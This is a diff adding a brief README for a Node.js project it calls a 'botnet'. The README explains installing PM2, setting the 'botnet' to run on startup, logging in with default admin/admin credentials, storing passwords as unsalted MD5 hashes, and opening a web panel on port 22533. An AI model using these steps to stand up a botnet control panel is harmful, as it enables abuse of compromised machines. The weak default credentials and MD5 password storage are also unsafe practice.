@@ -1,0 +1,28 @@
+Windows
+click HERE for downloads
+Install NodeJS Instructions Here (If you can't figure this out, you shouldn't really be using this)
+
+install PM2
+
+npm install pm2 -g
+Download and Extract HERE
+
+In the extracted folder, run these commands
+
+npm install <- install dependencies
+pm2 start index.js <-- start the script
+pm2 startup <- to run botnet on startup
+Default Username & Password
+
+Username: admin
+Password: admin
+Set Username & Password Manually
+
+Stop botnet pm2 stop index
+Open maindb.json in a text editor
+under admin
+set the username as plain text
+set the password as a LOWERCASE MD5 hash
+save the file
+run pm2 restart all
+in your browser navigate to http://<SERVER IP>:22533
